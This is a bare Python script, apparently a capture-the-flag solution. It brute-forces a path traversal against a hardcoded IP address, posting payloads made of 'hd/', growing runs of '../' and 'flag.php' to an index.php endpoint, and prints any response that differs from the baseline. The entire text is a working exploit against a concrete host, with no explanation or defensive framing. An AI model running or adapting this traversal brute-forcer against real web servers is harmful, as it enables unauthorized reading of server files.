import requests
from tqdm import trange

payload = 'hd/' + '../' + 'flag.php'
tmp = requests.post('http://35.236.149.150/computer_componets/index.php', data=payload).text
for i in trange(10000):
    payload = 'hd/' + '../' * i + 'flag.php'
    if tmp != requests.post('http://35.236.149.150/computer_componets/index.php', data=payload).text:
        print(requests.post('http://35.236.149.150/computer_componets/index.php', data=payload).text)